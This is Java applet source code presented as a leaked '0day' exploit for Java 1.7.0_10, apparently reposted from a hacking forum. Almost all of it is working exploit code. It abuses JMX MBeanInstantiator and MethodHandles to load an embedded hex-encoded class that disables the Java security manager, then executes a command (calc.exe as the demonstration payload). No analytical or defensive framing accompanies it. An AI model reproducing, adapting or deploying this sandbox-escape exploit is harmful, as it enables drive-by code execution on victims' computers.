/*
Java 0day 1.7.0_10 decrypted source
Originaly placed on https://damagelab.org/index.php?showtopic=23719&st=0
From Russia with love.
*/

import java.applet.Applet;

import com.sun.jmx.mbeanserver.JmxMBeanServer;

import com.sun.jmx.mbeanserver.JmxMBeanServerBuilder;

import com.sun.jmx.mbeanserver.MBeanInstantiator;

import java.lang.invoke.MethodHandle;

import java.lang.invoke.MethodHandles;

import java.lang.invoke.MethodType;

import java.lang.reflect.Method;





public byte[] hex2Byte(String paramString)

{

    byte[] arrayOfByte = new byte[paramString.length() / 2];

    for (int i = 0; i < arrayOfByte.length; i++)

    {

      arrayOfByte[i] = (byte)Integer.parseInt(paramString.substring(2 * i, 2 * i + 2), 16);

    }



    return arrayOfByte;

 }

public static String ByteArrayWithSecOff = & #34;CAFEBABE0000003200270A000500180A0019001A07001B0A001C001D07001E07001F07002001
 00063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C6501
 00124C6F63616C5661726961626C655461626C65010001650100154C6A6176612F6C616E672F4578
 63657074696F6E3B010004746869730100034C423B01000D537461636B4D61705461626C6507001F
 07001B01000372756E01001428294C6A6176612F6C616E672F4F626A6563743B01000A536F757263
 6546696C65010006422E6A6176610C000800090700210C002200230100136A6176612F6C616E672F
 457863657074696F6E0700240C002500260100106A6176612F6C616E672F4F626A65637401000142
 0100276A6176612F73656375726974792F50726976696C65676564457863657074696F6E41637469
 6F6E01001E6A6176612F73656375726974792F416363657373436F6E74726F6C6C657201000C646F
 50726976696C6567656401003D284C6A6176612F73656375726974792F50726976696C6567656445
 7863657074696F6E416374696F6E3B294C6A6176612F6C616E672F4F626A6563743B0100106A6176
 612F6C616E672F53797374656D01001273657453656375726974794D616E6167657201001E284C6A
 6176612F6C616E672F53656375726974794D616E616765723B295600210006000500010007000000
 020001000800090001000A0000006C000100020000000E2AB700012AB8000257A700044CB1000100
 040009000C00030003000B000000120004000000080004000B0009000C000D000D000C0000001600
 02000D0000000D000E00010000000E000F001000000011000000100002FF000C0001070012000107
 0013000001001400150001000A0000003A000200010000000C01B80004BB000559B70001B0000000
 02000B0000000A00020000001000040011000C0000000C00010000000C000F001000000001001600
0000020017";



  public void init()

  {

    try

    {

      

      byte[] arrayOfByte = hex2Byte(ByteArrayWithSecOff);

      JmxMBeanServerBuilder localJmxMBeanServerBuilder = new JmxMBeanServerBuilder();

      JmxMBeanServer localJmxMBeanServer = (JmxMBeanServer)localJmxMBeanServerBuilder.newMBeanServer("", null, null);

      MBeanInstantiator localMBeanInstantiator = localJmxMBeanServer.getMBeanInstantiator();

      ClassLoader a = null;

      Class localClass1 = localMBeanInstantiator.findClass("sun.org.mozilla.javascript.internal.Context", a);

      Class localClass2 = localMBeanInstantiator.findClass("sun.org.mozilla.javascript.internal.GeneratedClassLoader", a);

      MethodHandles.Lookup localLookup = MethodHandles.publicLookup();

      MethodType localMethodType1 = MethodType.methodType(MethodHandle.class, Class.class, new Class[] { MethodType.class });

      MethodHandle localMethodHandle1 = localLookup.findVirtual(MethodHandles.Lookup.class, "findConstructor", localMethodType1);

      MethodType localMethodType2 = MethodType.methodType(Void.TYPE);

      MethodHandle localMethodHandle2 = (MethodHandle)localMethodHandle1.invokeWithArguments(new Object[] { localLookup, localClass1, localMethodType2 });

      Object localObject1 = localMethodHandle2.invokeWithArguments(new Object[0]);

      MethodType localMethodType3 = MethodType.methodType(MethodHandle.class, Class.class, new Class[] { String.class, MethodType.class });

      MethodHandle localMethodHandle3 = localLookup.findVirtual(MethodHandles.Lookup.class, "findVirtual", localMethodType3);

      MethodType localMethodType4 = MethodType.methodType(localClass2, ClassLoader.class);

      MethodHandle localMethodHandle4 = (MethodHandle)localMethodHandle3.invokeWithArguments(new Object[] { localLookup, localClass1, "createClassLoader", localMethodType4 });

      Object localObject2 = localMethodHandle4.invokeWithArguments(new Object[] { localObject1, null });

      MethodType localMethodType5 = MethodType.methodType(Class.class, String.class, new Class[] { byte[].class });

      MethodHandle localMethodHandle5 = (MethodHandle)localMethodHandle3.invokeWithArguments(new Object[] { localLookup, localClass2,"defineClass", localMethodType5 });

      Class localClass3 = (Class)localMethodHandle5.invokeWithArguments(new Object[] { localObject2, null, arrayOfByte });

      localClass3.newInstance();





      Runtime.getRuntime().exec("calc.exe");



    }   

    catch (Throwable ex) {}

  }

}
